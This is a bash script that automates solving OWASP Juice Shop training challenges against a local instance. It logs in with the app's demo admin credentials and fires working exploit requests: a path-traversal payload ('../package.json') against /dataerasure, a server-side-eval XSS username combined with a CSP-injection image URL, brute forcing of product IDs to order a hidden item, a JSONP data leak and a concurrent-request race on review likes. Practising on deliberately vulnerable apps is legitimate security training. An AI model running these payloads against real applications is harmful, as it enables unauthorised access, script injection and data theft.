#!/usr/bin/env bash
set -euo pipefail

BASE=${BASE:-http://127.0.0.1:3000}

cmd=${1:-}

fetch_challenges(){
  local outfile
  outfile=$(mktemp /tmp/jsqw_ch.XXXXXX.json)
  if ! curl -sS -o "$outfile" "$BASE/api/Challenges"; then
    echo "Failed to download challenge list from $BASE/api/Challenges" >&2
    return 1
  fi
  if [[ ! -s "$outfile" ]]; then
    echo "Challenge list download is empty at $outfile" >&2
    return 1
  fi
  echo "$outfile"
}

challenge_totals(){
  local file
  file=$(fetch_challenges) || exit $?
  python3 - "$file" <<'PY'
import json,sys
path=sys.argv[1]
with open(path) as f:
    data=json.load(f)
ch=data.get('data', data)
total=len(ch)
solved=sum(1 for c in ch if c.get('solved'))
print(f"{solved} {total} {total-solved}")
PY
}

login_admin(){
  curl -sS -X POST "$BASE/rest/user/login" \
    -H 'Content-Type: application/json' \
    -d '{"email":"admin@juice-sh.op","password":"admin123"}'
}

token_from_login(){
  python3 -c "import json,sys; print(json.loads(sys.stdin.read())['authentication']['token'])"
}

bid_from_login(){
  python3 -c "import json,sys; print(json.loads(sys.stdin.read())['authentication']['bid'])"
}


if [[ "$cmd" != "state" && "$cmd" != "unsolved" && "$cmd" != "fingerprint" && "$cmd" != "login" && "$cmd" != "token" && "$cmd" != "" && "$cmd" != "help" && "$cmd" != "-h" && "$cmd" != "--help" ]]; then
  read -r solved total _unsolved <<<"$(challenge_totals)"
  if [[ "$solved" == "$total" && -n "$total" && "${FORCE:-}" != "1" ]]; then
    echo "Phantom wipe suspected: /api/Challenges reports $solved/$total solved. Aborting (set FORCE=1 to override)." >&2
    exit 1
  fi
fi

case "$cmd" in
  login)
    login_admin
    ;;
  token)
    login_admin | token_from_login
    ;;
  state)
    file=$(fetch_challenges) || exit $?
    python3 - "$file" <<'PY'
import json,sys
path=sys.argv[1]
with open(path) as f:
    data=json.load(f)
ch=data.get('data', data)
total=len(ch)
solved=sum(1 for c in ch if c.get('solved'))
print(f"solved: {solved}/{total}")
print(f"unsolved: {total-solved}")
PY
    ;;
  fingerprint)
    netstat -plnt 2>/dev/null | awk '$4 ~ /:3000$/ && $6=="LISTEN"'
    file=$(fetch_challenges) || exit $?
    python3 - "$file" <<'PY'
import hashlib, json, sys
path=sys.argv[1]
with open(path) as f:
    data=json.load(f)
ch=data.get('data', data)
solved=[c for c in ch if c.get('solved')]
total=len(ch)
keys=sorted(c.get('key','') for c in solved if c.get('key'))
joined="\n".join(keys)
print(f"solved: {len(solved)}/{total}")
print(f"unsolved: {total-len(solved)}")
print("solved_keys_sha256:", hashlib.sha256(joined.encode()).hexdigest())
PY
    TOKEN=$(login_admin | token_from_login)
    APPFILE=$(mktemp /tmp/jsqw_appcfg.XXXXXX.json)
    curl -sS -H "Authorization: Bearer $TOKEN" -o "$APPFILE" "$BASE/rest/admin/application-configuration"
    python3 - "$APPFILE" <<'PY'
import hashlib, json, sys
path=sys.argv[1]
with open(path) as f:
    cfg=json.load(f).get("config")
if cfg is None:
    sys.exit(f"Missing config key in {path} (expected top-level 'config')")
blob=json.dumps(cfg, sort_keys=True, separators=(",", ":")).encode()
print("rest_admin_appcfg_sha256:", hashlib.sha256(blob).hexdigest())
PY
    ;;
  unsolved)
    curl -sS -o /tmp/ch.json "$BASE/api/Challenges"
    python3 "$(dirname "$0")/list_unsolved.py" /tmp/ch.json
    ;;
  email-leak)
    TOKEN=${TOKEN:-$(login_admin | token_from_login)}
    curl -sS "$BASE/rest/user/whoami?callback=foo" -H "Authorization: Bearer $TOKEN"
    ;;
  access-log)
    FILE=$(curl -sS "$BASE/support/logs" | python3 -c 'import re,sys,os; html=sys.stdin.read(); m=re.search(r"href=\"([^\"]*access\.log[^\"]*)\"", html); print(os.path.basename(m.group(1)) if m else "")')
    echo "logfile=$FILE"
    [ -n "$FILE" ] && curl -sS "$BASE/support/logs/$FILE" | head
    ;;
  coding-fixes)
    python3 "$(dirname "$0")/solve_coding_challenges.py" --base "$BASE" "${@:2}"
    ;;
  coding-continue)
    python3 "$(dirname "$0")/solve_coding_challenges.py" --base "$BASE" --unsolved-only --continue-on-error "${@:2}"
    ;;
  lfr)
    TOKEN=${TOKEN:?set TOKEN (JWT) or run: TOKEN=$(./js_quickwins.sh token)}
    curl -sS -o /dev/null -D - -X POST "$BASE/dataerasure" \
      -H "Cookie: token=$TOKEN" \
      -H 'Content-Type: application/x-www-form-urlencoded' \
      --data-urlencode 'layout=../package.json' \
      --data-urlencode 'email=x' \
      --data-urlencode 'securityAnswer=x'
    ;;
  csp-bypass)
    LOGIN_JSON=$(login_admin)
    TOKEN=$(printf '%s' "$LOGIN_JSON" | token_from_login)
    # IMPORTANT: do NOT use bash $'..' quoting here (it would turn \x3c into '<' locally).
    # We need the literal characters "\x3c" to be stored so server-side eval() yields "<".
    USERNAME_PAYLOAD=${USERNAME_PAYLOAD:-"#{'\\x3cscript>alert(\`xss\`)\\x3c/script>'}"}
    IMG_URL=${IMG_URL:-"http://127.0.0.1:1/; script-src 'unsafe-inline'"}
    COOKIEJAR=$(mktemp /tmp/jsqw_cookiejar.XXXXXX)
    curl -sS -X POST "$BASE/profile" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -H "Cookie: token=$TOKEN" \
      -c "$COOKIEJAR" \
      --data-urlencode "username=${USERNAME_PAYLOAD}"
    curl -sS -X POST "$BASE/profile/image/url" \
      -b "$COOKIEJAR" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      --data-urlencode "imageUrl=${IMG_URL}"
    curl -sS "$BASE/profile" -b "$COOKIEJAR" -o /dev/null
    status_line=$(curl -sS "$BASE/api/Challenges" | python3 -c 'import json,sys; data=json.load(sys.stdin); ch=data.get("data", data); target=[c for c in ch if c.get("key")=="usernameXssChallenge"]; solved=bool(target and target[0].get("solved")); print(f"usernameXssChallenge solved={str(solved).lower()}")')
    echo "$status_line"
    if [[ "$status_line" != *"solved=true"* ]]; then
      echo "Hint: ensure username payload stays like #{'\\x3cscript>alert(\`xss\`)\\x3c/script>'} (avoid double-escaped backslashes) and reuse the cookie jar across /profile and /profile/image/url." >&2
    fi
    ;;
  christmas-special)
    LOGIN_JSON=$(login_admin)
    TOKEN=$(printf '%s' "$LOGIN_JSON" | token_from_login)
    BID=$(printf '%s' "$LOGIN_JSON" | bid_from_login)
    PID_MAX=${PID_MAX:-30}
    FOUND_PID=""
    for pid in $(seq 1 "$PID_MAX"); do
      resp=$(curl -sS -X POST "$BASE/api/BasketItems" \
        -H "Authorization: Bearer $TOKEN" \
        -H 'Content-Type: application/json' \
        -H 'Accept: application/json' \
        -d "{\"ProductId\":$pid,\"BasketId\":$BID,\"quantity\":1}")
      status=$(printf '%s' "$resp" | python3 -c 'import json,sys; raw=sys.stdin.read();
try:
    data=json.loads(raw)
except Exception:
    print(""); raise SystemExit(0)
print(data.get("status",""))')
      if [[ "$status" == "success" ]]; then
        FOUND_PID=$pid
        echo "Found ProductId=$pid"
        break
      fi
    done
    if [[ -z "$FOUND_PID" ]]; then
      echo "No ProductId succeeded up to PID_MAX=$PID_MAX" >&2
      exit 1
    fi
    ADDR_ID=$(curl -sS -H "Authorization: Bearer $TOKEN" "$BASE/api/Addresses" | python3 -c 'import json,sys; data=json.load(sys.stdin); items=data.get("data") or data.get("addresses") or [];
if not items: raise SystemExit("No addresses found");
addr=items[0]; print(addr.get("id") or addr.get("_id"))')
    CARD_ID=$(curl -sS -H "Authorization: Bearer $TOKEN" "$BASE/api/Cards" | python3 -c 'import json,sys; data=json.load(sys.stdin); items=data.get("data") or data.get("cards") or [];
if not items: raise SystemExit("No cards found");
card=items[0]; print(card.get("id") or card.get("_id"))')
    curl -sS -X POST "$BASE/rest/basket/$BID/order" \
      -H "Authorization: Bearer $TOKEN" \
      -H 'Content-Type: application/json' \
      -d "{\"orderDetails\":{\"paymentMethodId\":$CARD_ID,\"deliveryMethodId\":1,\"addressId\":$ADDR_ID}}"
    curl -sS "$BASE/api/Challenges" | python3 -c 'import json,sys; data=json.load(sys.stdin); ch=data.get("data", data); target=[c for c in ch if c.get("key")=="christmasSpecialChallenge"];
print("christmasSpecialChallenge: not found" if not target else f"christmasSpecialChallenge solved={bool(target[0].get(\"solved\"))}")'
    ;;
  multiple-likes)
    TOKEN=${TOKEN:-$(login_admin | token_from_login)}
    REVIEW_ID=$(curl -sS -H "Authorization: Bearer $TOKEN" "$BASE/rest/products/1/reviews" | python3 -c 'import json,sys; data=json.load(sys.stdin); reviews=data.get("data") or data;
for r in reviews:
    if r.get("liked") is True: continue
    rid=r.get("_id") or r.get("id")
    if rid: print(rid); break
else:
    raise SystemExit("No review with liked!=true found")')
    REVIEW_ID=$REVIEW_ID BASE=$BASE TOKEN=$TOKEN LIKE_N=${LIKE_N:-20} node - <<'NODE'
const base=process.env.BASE || 'http://127.0.0.1:3000';
const token=process.env.TOKEN;
const reviewId=process.env.REVIEW_ID;
const n=parseInt(process.env.LIKE_N || '20',10);
if(!token){console.error('TOKEN missing');process.exit(1);}
if(!reviewId){console.error('REVIEW_ID missing');process.exit(1);}
const headers={'Content-Type':'application/json',Authorization:`Bearer ${token}`};
const body=JSON.stringify({id:reviewId});
async function fire(idx){
  const res=await fetch(`${base}/rest/products/reviews`,{method:'POST',headers,body});
  return {ok:res.ok,status:res.status,idx};
}
(async()=>{
  const jobs=Array.from({length:n},(_,i)=>fire(i));
  const results=await Promise.allSettled(jobs);
  let ok=0,fail=0;
  for (const r of results){
    if(r.status==='fulfilled' && r.value.ok){ok++;}
    else{fail++;}
  }
  console.log(`Likes sent: ok=${ok} fail=${fail}`);
  process.exit(ok>0?0:1);
})().catch(err=>{console.error(err);process.exit(1);});
NODE
    curl -sS "$BASE/api/Challenges" | python3 -c 'import json,sys; data=json.load(sys.stdin); ch=data.get("data", data); target=[c for c in ch if c.get("key")=="timingAttackChallenge"];
print("timingAttackChallenge: not found" if not target else f"timingAttackChallenge solved={bool(target[0].get(\"solved\"))}")'
    ;;
  *)
    cat <<EOF
Usage: BASE=http://127.0.0.1:3000 $0 <command>

Commands:
  login         Print admin login JSON (demo creds)
  token         Print JWT token only
  fingerprint   Instance fingerprint: port 3000 listener, solved counts/hashes, appcfg hash
  state         Print solved/total and unsolved count
  unsolved      List unsolved challenges
  email-leak    Run JSONP whoami (requires Bearer)
  access-log    Fetch most recent access.log* link (support/logs)
  coding-fixes  Auto-solve coding challenges via snippets API (see --help)
  coding-continue  Auto-solve coding challenges (unsolved-only, keep going on errors)
  csp-bypass    CSP bypass via /profile (username + profile image URL flow)
  lfr           Trigger LFR via /dataerasure (requires TOKEN env; cookie auth)
  christmas-special  Brute ProductId, place order, report christmasSpecialChallenge
  multiple-likes     Concurrent likes on first unliked review for product 1

Notes:
- This is for OWASP Juice Shop training only.
- Avoid pasting live JWTs into shared chat/logs.
EOF
    ;;
esac
